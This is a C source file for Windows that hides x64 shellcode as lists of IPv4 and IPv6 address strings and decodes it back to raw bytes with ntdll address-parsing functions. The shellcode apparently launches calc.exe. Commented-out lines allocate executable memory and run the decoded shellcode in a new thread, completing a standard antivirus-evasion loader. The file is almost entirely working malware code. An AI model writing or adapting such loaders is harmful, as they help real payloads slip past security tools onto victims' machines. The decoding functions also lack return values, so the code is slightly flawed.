#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR   S,
	BOOLEAN Strict,
	PCSTR* Terminator,
	PVOID* Addr
	);

BOOL IPv4_deobfuscation(IN CHAR* IPv4_array[], IN INT number_of_elements, OUT PBYTE* p_to_decrypted_address, OUT INT* p_to_decrypted_size) {
	PBYTE pBuffer = NULL;
	PBYTE temp_buffer = NULL;
	INT buff_size = NULL;
	PCSTR terminator = NULL;

	HMODULE ntdll = LoadLibraryA("ntdll.dll");

	fnRtlIpv4StringToAddressA p_to_RtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(ntdll, "RtlIpv4StringToAddressA");

	buff_size = number_of_elements * 4;

	pBuffer = HeapAlloc(GetProcessHeap(),0,buff_size);

	temp_buffer = pBuffer;

	for (int i = 0; i < number_of_elements; i++) {
		p_to_RtlIpv4StringToAddressA(IPv4_array[i],FALSE,&terminator,temp_buffer);
		temp_buffer +=4;
	}

	*p_to_decrypted_address =  pBuffer;
	*p_to_decrypted_size = buff_size;
}


//int  main() {
//	char* IPv4_array[69] = { "252.72.131.228","240.232.192.0","0.0.65.81","65.80.82.81","86.72.49.210","101.72.139.82","96.72.139.82","24.72.139.82","32.72.139.114","80.72.15.183","74.74.77.49","201.72.49.192","172.60.97.124","2.44.32.65","193.201.13.65","1.193.226.237","82.65.81.72","139.82.32.139","66.60.72.1","208.139.128.136","0.0.0.72","133.192.116.103","72.1.208.80","139.72.24.68","139.64.32.73","1.208.227.86","72.255.201.65","139.52.136.72","1.214.77.49","201.72.49.192","172.65.193.201","13.65.1.193","56.224.117.241","76.3.76.36","8.69.57.209","117.216.88.68","139.64.36.73","1.208.102.65","139.12.72.68","139.64.28.73","1.208.65.139","4.136.72.1","208.65.88.65","88.94.89.90","65.88.65.89","65.90.72.131","236.32.65.82","255.224.88.65","89.90.72.139","18.233.87.255","255.255.93.72","186.1.0.0","0.0.0.0","0.72.141.141","1.1.0.0","65.186.49.139","111.135.255.213","187.224.29.42","10.65.186.166","149.189.157.255","213.72.131.196","40.60.6.124","10.128.251.224","117.5.187.71","19.114.111.106","0.89.65.137","218.255.213.99","97.108.99.46","101.120.101.0" };
//
//	PBYTE decrypted_address = NULL;
//	INT decrypted_size = 0;
//
//	IPv4_deobfuscation(IPv4_array,69,&decrypted_address,&decrypted_size);
//
//	for (int i = 0; i < decrypted_size; i++) {
//		printf("\\x%02x",decrypted_address[i]);
//	}
//
//	
//}

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR   S,
	PCSTR* Terminator,
	PVOID* Addr
	);

BOOL IPv6_deobfuscation(IN CHAR* IPv6_array[], IN INT number_of_elements, OUT PBYTE* p_to_decrypted_address, OUT INT* p_to_decrypted_size) {
	PBYTE pBuffer = NULL;
	PBYTE temp_buffer = NULL;
	INT buff_size = NULL;
	PCSTR terminator = NULL;

	HMODULE ntdll = LoadLibraryA("ntdll.dll");

	fnRtlIpv6StringToAddressA p_to_RtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(ntdll, "RtlIpv6StringToAddressA");

	buff_size = number_of_elements * 16;

	pBuffer = HeapAlloc(GetProcessHeap(), 0, buff_size);

	temp_buffer = pBuffer;

	for (int i = 0; i < number_of_elements; i++) {
		p_to_RtlIpv6StringToAddressA(IPv6_array[i],&terminator, temp_buffer);
		temp_buffer += 16;
	}

	*p_to_decrypted_address = pBuffer;
	*p_to_decrypted_size = buff_size;
}


int  main() {
	char* IPv6_array[] = { "FC48:83E4:F0E8:C000:0000:4151:4150:5251","5648:31D2:6548:8B52:6048:8B52:1848:8B52","2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0","AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED","5241:5148:8B52:208B:423C:4801:D08B:8088","0000:0048:85C0:7467:4801:D050:8B48:1844","8B40:2049:01D0:E356:48FF:C941:8B34:8848","01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1","38E0:75F1:4C03:4C24:0845:39D1:75D8:5844","8B40:2449:01D0:6641:8B0C:4844:8B40:1C49","01D0:418B:0488:4801:D041:5841:585E:595A","4158:4159:415A:4883:EC20:4152:FFE0:5841","595A:488B:12E9:57FF:FFFF:5D48:BA01:0000","0000:0000:0048:8D8D:0101:0000:41BA:318B","6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF","D548:83C4:283C:067C:0A80:FBE0:7505:BB47","1372:6F6A:0059:4189:DAFF:D563:616C:632E","6578:6500:00CC:CCCC:CCCC:CCCC:CCCC:CCCC" };


	char* IPv4_array[69] = { "252.72.131.228","240.232.192.0","0.0.65.81","65.80.82.81","86.72.49.210","101.72.139.82","96.72.139.82","24.72.139.82","32.72.139.114","80.72.15.183","74.74.77.49","201.72.49.192","172.60.97.124","2.44.32.65","193.201.13.65","1.193.226.237","82.65.81.72","139.82.32.139","66.60.72.1","208.139.128.136","0.0.0.72","133.192.116.103","72.1.208.80","139.72.24.68","139.64.32.73","1.208.227.86","72.255.201.65","139.52.136.72","1.214.77.49","201.72.49.192","172.65.193.201","13.65.1.193","56.224.117.241","76.3.76.36","8.69.57.209","117.216.88.68","139.64.36.73","1.208.102.65","139.12.72.68","139.64.28.73","1.208.65.139","4.136.72.1","208.65.88.65","88.94.89.90","65.88.65.89","65.90.72.131","236.32.65.82","255.224.88.65","89.90.72.139","18.233.87.255","255.255.93.72","186.1.0.0","0.0.0.0","0.72.141.141","1.1.0.0","65.186.49.139","111.135.255.213","187.224.29.42","10.65.186.166","149.189.157.255","213.72.131.196","40.60.6.124","10.128.251.224","117.5.187.71","19.114.111.106","0.89.65.137","218.255.213.99","97.108.99.46","101.120.101.0" };

	PBYTE decrypted_address_for_IPv4 = NULL;
	INT decrypted_size_for_IPv4 = 0;

	PBYTE decrypted_address_for_IPv6 = NULL;
	INT decrypted_size_for_IPv6 = 0;

	int size_of_array = sizeof(IPv6_array) / sizeof(IPv6_array[0]);

	IPv6_deobfuscation(IPv6_array,size_of_array, &decrypted_address_for_IPv6, &decrypted_size_for_IPv6);

	IPv4_deobfuscation(IPv4_array, 69, &decrypted_address_for_IPv4, &decrypted_size_for_IPv4);

	printf("IPv4:\n");

	for (int i = 0; i < decrypted_size_for_IPv4; i++) {
		printf("\\x%02x", decrypted_address_for_IPv4[i]);
	}

	printf("\n");

	printf("IPv6:\n");

	for (int i = 0; i < decrypted_size_for_IPv6; i++) {
		printf("\\x%02x", decrypted_address_for_IPv6[i]);
	}


	//LPVOID alloc = VirtualAlloc(NULL,decrypted_size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\

	//memcpy(alloc,decrypted_address, decrypted_size);

	//HANDLE create_thread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)alloc,NULL,0,NULL);

	//WaitForSingleObject(create_thread,5000);

}

